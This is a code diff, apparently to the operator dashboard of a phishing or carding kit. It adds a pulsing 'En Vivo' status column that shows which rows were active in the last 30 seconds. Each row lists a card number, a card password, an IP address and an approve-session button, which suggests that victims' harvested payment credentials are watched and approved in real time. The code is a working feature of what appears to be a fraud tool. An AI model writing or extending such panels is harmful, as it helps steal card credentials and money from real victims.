@@ -201,6 +201,39 @@
             opacity: 0.5;
             cursor: not-allowed;
         }
+        .status-dot {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 6px;
+            vertical-align: middle;
+            animation: pulse-dot 2s ease-in-out infinite;
+        }
+        .status-dot.active {
+            background-color: #6ac90f;
+            box-shadow: 0 0 6px rgba(106, 201, 15, 0.6);
+        }
+        .status-dot.inactive {
+            background-color: #e30425;
+            box-shadow: 0 0 6px rgba(227, 4, 37, 0.4);
+        }
+        .status-dot.unknown {
+            background-color: #bfc4cc;
+            box-shadow: none;
+            animation: none;
+        }
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        .status-label {
+            font-size: 0.8rem;
+            vertical-align: middle;
+        }
+        .status-label.active { color: #37a500; }
+        .status-label.inactive { color: #e30425; }
+        .status-label.unknown { color: #868f9e; }
         .empty-state {
             text-align: center;
             padding: 60px 20px;
@@ -478,6 +511,7 @@
                             <th>Fecha</th>
                             <th>IP</th>
                             <th>Estado</th>
+                            <th>En Vivo</th>
                             <th>Acciones</th>
                         </tr>
                     </thead>
@@ -491,6 +525,23 @@
                 const cardNumber = item.card_number || '';
                 const cardPassword = item.card_password || '';
                 const formattedCard = formatCardNumber(cardNumber);
+
+                // Determinar estado en vivo basado en last_activity
+                const lastActivity = item.last_activity ? new Date(item.last_activity) : null;
+                const now = new Date();
+                let liveStatus = 'unknown';
+                let liveLabel = 'Desconocido';
+                if (lastActivity) {
+                    const diffMs = now - lastActivity;
+                    const diffSecs = Math.floor(diffMs / 1000);
+                    if (diffSecs <= 30) {
+                        liveStatus = 'active';
+                        liveLabel = 'En vivo';
+                    } else {
+                        liveStatus = 'inactive';
+                        liveLabel = 'Inactivo';
+                    }
+                }
 
                 html += `
                     <tr>
@@ -507,6 +558,10 @@
                         <td>${formatearFecha(item.created_at)}</td>
                         <td>${item.ip_address || '-'}</td>
                         <td><span class="status-badge ${estadoClass}">${estadoLabel}</span></td>
+                        <td>
+                            <span class="status-dot ${liveStatus}"></span>
+                            <span class="status-label ${liveStatus}">${liveLabel}</span>
+                        </td>
                         <td>
                             <div class="actions">
                                 <button class="btn-approve" onclick="aprobarSesion(${item.id})" ${estado !== 'pendiente' ? 'disabled' : ''}>
